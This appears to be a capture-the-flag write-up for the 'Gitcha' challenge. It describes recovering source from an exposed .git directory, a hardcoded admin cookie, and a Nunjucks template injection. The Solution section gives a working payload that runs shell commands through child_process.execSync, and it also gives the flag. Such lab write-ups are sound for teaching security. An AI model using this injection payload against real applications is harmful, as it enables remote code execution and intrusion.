# Gitcha

## Description

Simon is maintaining a personal portfolio website, along with a secret which no one else knows.

Can you discover his secret?

## Analysis

Website is empty placeholder, single page application. Looking into the source I found:

```html
<!-- John, don't forget to take the .git route down, we don't need it anymore -->
```

Looks like someone forgot to take down `.git`. Using [git-dumper](https://github.com/arthaud/git-dumper) let's get the source.

First thing we should look into in a node application is `index.js`.

First discovery:

```js
const checkAdmin = (req, res) => {
  if (req.cookies["SECRET_COOKIE_VALUE"] === "thisisahugesecret") {
    return true;
  }
  return false;
};
```

Second discovery:

```js
app.get("/robots.txt", (req, res) => {
  res.type("text/plain");
  res.send("User-agent: *\nDisallow: /.git/\nDisallow: /supersecret/");
});
```

Possible attack vector:

```js
app.get("/getnotedetails", async (req, res) => {
  if (checkAdmin(req, res)) {
    const { id } = req.query;
    const note = await prisma.note.findUnique({ where: { id: parseInt(id) } });
    res.send(
      nunjucks.renderString(`
      <div style="margin: 15px;">
        <h1 style="font-family: Roboto;">${note.title}</h1>
        <p>${note.content}</p>
      </div>
  `)
    );
  } else {
    res.redirect("/");
  }
});
```

Quick google search about vulnaribility of `nunjucks` shows a great post by Emilio Pinna (IT security researcher).<br>
<https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine>

## Solution

1. Set cookie: `SECRET_COOKIE_VALUE=thisisahugesecret`
2. Go to `/supersecret`
3. Create note
	* Title: Anything
	* Content: ::: raw `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat flag.txt')")()}}` :::
4. Go back to `/supersecret` and Refresh.
5. See note contents
6. Profit
::: tip Flag
`dsc{g1t_enum3r4ti0n_4nD_sSt1}`
:::